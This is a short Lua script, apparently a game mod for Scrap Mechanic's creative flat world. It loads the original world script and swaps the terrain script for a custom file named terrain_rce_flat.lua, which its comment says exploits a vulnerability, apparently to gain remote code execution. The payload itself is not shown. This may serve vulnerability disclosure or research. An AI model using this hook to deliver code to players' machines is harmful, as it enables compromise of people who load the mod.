-- Call the original file so we have everything we need
dofile("$GAME_DATA/Scripts/game/worlds/CreativeFlatWorld.lua")

-- Change the terrain script to use our own script that exploits the vulnerability
CreativeFlatWorld.terrainScript = "$CONTENT_637efa72-b1cc-4b16-86c3-222ecad21bcd/Scripts/game/terrain/terrain_rce_flat.lua"